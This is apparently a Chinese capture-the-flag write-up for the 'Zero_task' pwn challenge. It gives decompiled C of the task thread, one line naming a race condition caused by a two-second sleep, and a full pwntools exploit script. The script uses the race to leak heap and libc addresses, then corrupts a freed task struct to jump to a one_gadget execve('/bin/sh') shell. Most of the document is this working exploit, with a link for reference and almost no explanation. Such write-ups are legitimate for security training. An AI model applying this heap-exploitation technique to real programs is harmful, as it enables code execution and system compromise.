# Zero_task

漏洞为条件竞争,go的时候线程sleep了2秒

```c
void __fastcall __noreturn start_routine(task *a1)
{
  int v1; // [rsp+14h] [rbp-2Ch]
  task *v2[2]; // [rsp+18h] [rbp-28h]
  __int64 v3; // [rsp+28h] [rbp-18h]
  __int64 v4; // [rsp+30h] [rbp-10h]
  unsigned __int64 v5; // [rsp+38h] [rbp-8h]

  v5 = __readfsqword(0x28u);
  *(_OWORD *)v2 = (unsigned __int64)a1;
  v1 = 0;
  v3 = 0LL;
  v4 = 0LL;
  puts("Prepare...");
  sleep(2u);
  memset(qword_202030, 0, 0x1010uLL);
  if ( !(unsigned int)EVP_CipherUpdate(
                        v2[0]->EVP_CTX_new_PTR,
                        qword_202030,
                        &v1,
                        v2[0]->data,
                        (unsigned int)v2[0]->data_sz) )
    pthread_exit(0LL);
  v2[1] = (task *)((char *)v2[1] + v1);
  if ( !(unsigned int)EVP_CipherFinal_ex(v2[0]->EVP_CTX_new_PTR, (char *)qword_202030 + (unsigned __int64)v2[1], &v1) )
    pthread_exit(0LL);
  v2[1] = (task *)((char *)v2[1] + v1);
  puts("Ciphertext: ");
  show_ciphertext(stdout, (unsigned __int8 *)qword_202030, (unsigned __int64)v2[1], 0x10uLL, 1uLL);
  pthread_exit(0LL);
}
```

```python
from pwn import *
import time
p = process("./task")
libc = ELF("./libc-2.27.so")
def add(id,flag,key,iv,sz,data):
	p.recvuntil("Choice: ")
	p.sendline("1")
	p.recvuntil("Task id :")
	p.sendline(str(id))
	p.recvuntil("Encrypt(1) / Decrypt(2): ")
	p.sendline(str(flag))
	p.recvuntil("Key :")
	p.send(key)
	p.recvuntil("IV :")
	p.send(iv)
	p.recvuntil('Data Size :')
	p.sendline(str(sz))
	p.recvuntil("Data")
	p.send(data)
def add_(id,flag,key,iv,sz,data):
	p.sendline("1")
	p.recvuntil("Task id :")
	p.sendline(str(id))
	p.recvuntil("Encrypt(1) / Decrypt(2): ")
	p.sendline(str(flag))
	p.recvuntil("Key :")
	p.send(key)
	p.recvuntil("IV :")
	p.send(iv)
	p.recvuntil('Data Size :')
	p.sendline(str(sz))
	p.recvuntil("Data")
	p.send(data)
def delete(id):
	p.recvuntil("Choice: ")
	p.sendline("2")
	p.recvuntil("Task id :")
	p.sendline(str(id))
def go(id):
	p.recvuntil("Choice: ")
	p.sendline("3")
	p.recvuntil("Task id :")
	p.sendline(str(id))
def main():
	gdb.attach(p)
	for i in range(0,4):
		add(i,1,'a'*0x20,'a'*0x10,0x100,'1'*0x100)
	
	add(20,1,'a'*0x20,'a'*0x10,0x250,'1'*0x250)
	add(21,1,'a'*0x20,'a'*0x10,8,'1'*8)
	add(22,1,'a'*0x20,'a'*0x10,8,'1'*8)
	add(23,1,'a'*0x20,'a'*0x10,8,'1'*8)
	add(24,1,'a'*0x20,'a'*0x10,8,'1'*8)
	
	for i in range(0,4):
		delete(str(i))
	
	go(20)
	delete(20)
	
	delete(21)
	delete(22)
	
	add(21,1,'a'*0x20,'a'*0x10,0xa0,'1'*0xa0)
	add(22,1,'a'*0x20,'a'*0x10,8,'1'*8)
	
	p.readuntil('Ciphertext: \n')
	
	data = ''.join((''.join(p.recv(0x745).split(' '))).split('\n'))
	
	#leak
	add_(233,2,'a'*0x20,'a'*0x10,len(data.decode('hex')),data.decode('hex'))
	
	go(233)
	p.readuntil('Ciphertext: \n')
	heap = u64((''.join(p.recv(24).split(' '))).decode('hex'))-0x1920
	for _ in range(36):
		p.recvuntil('\n')

	libc.address = u64((''.join(p.recv(24).split(' '))).decode('hex'))-0x3ebda0
	success('heap : ' + hex(heap))
	success('libc : ' + hex(libc.address))
	
	# 0x4f2c5	execve("/bin/sh", rsp+0x40, environ)
	# constraints:
	# rcx == NULL

	# 0x4f322	execve("/bin/sh", rsp+0x40, environ)
	# constraints:
	# [rsp+0x40] == NULL

	# 0x10a38c	execve("/bin/sh", rsp+0x70, environ)
	# constraints:
	# [rsp+0x70] == NULL
	one_gadget = 0x10a38c+libc.address
	success('one_gadget : ' + hex(one_gadget))
	
	add_(234,1,'a'*0x20,'a'*0x10,8,'1'*8)
	
	go(234)
	delete(234)
	delete(23)
	add_(234,1,'a'*0x20,'a'*0x10,0xa0,p64(heap+0x19a0)+'1'*0x18+p64(one_gadget))
	
	p.interactive()
if __name__ == "__main__":
	main()
```

参考链接: [](https://www.anquanke.com/post/id/175401)
